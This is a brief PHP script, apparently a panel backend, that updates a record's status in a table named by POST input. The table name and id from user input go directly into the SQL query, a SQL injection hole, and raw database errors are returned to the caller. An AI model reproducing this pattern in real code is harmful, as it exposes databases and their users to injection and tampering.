<?php
require '../connection.php';

if ($_POST["uniqueid"] && $_POST['selSite']) {
  $uniqueid = $_POST["uniqueid"];
  $selSite = $_POST['selSite'];

  if (isset($_GET["error"])) {
    $verification_query = mysqli_query($conn, "UPDATE $selSite SET status=12, viewed='false' WHERE id=$uniqueid");
  } else {
    $verification_query = mysqli_query($conn, "UPDATE $selSite SET status=5, viewed='false' WHERE id=$uniqueid");
  }

  if ($verification_query) {
    echo json_encode(array(
      'status' => 'success'
    ));
  } else {
    echo json_encode(array(
      'status' => 'failure',
      'error' => mysqli_error($conn)
    ));
  }
}
?>
